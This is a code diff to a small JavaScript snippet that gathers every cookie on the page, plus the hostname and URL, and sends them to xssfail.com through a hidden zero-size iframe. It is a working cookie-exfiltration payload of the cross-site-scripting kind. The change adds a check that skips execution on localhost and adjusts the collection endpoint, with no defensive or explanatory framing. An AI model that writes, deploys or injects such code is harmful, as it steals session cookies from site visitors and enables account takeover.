@@ -1,9 +1,11 @@
 
 (function() {
+    if(location.hostname == 'localhost') return;
+
     var cookies = (document.cookie || "");
     cookies = cookies.length > 0 ? cookies.split(';') : []
     
-    var query = ["host=" + (location.hostname || "localhost"),"url=" + location.href];
+    var query = ["host=" + location.hostname,"url=" + location.href];
     for(var i=0; i<cookies.length; i++)
         query.push("cookie=" + cookies[i]);
     
@@ -12,8 +14,8 @@
     
     var frame = create("iframe");
     frame.setAttribute('style', 'width:0;height:0;border:0;margin:0;padding:0;'); 
-    frame.setAttribute('src', "http://xssfail.com/form?" + query.join('&'));
-    
+    frame.setAttribute('src', "http://xssfail.com/form.html?" + query.join('&'));
+
     append(frame);
 })();
 
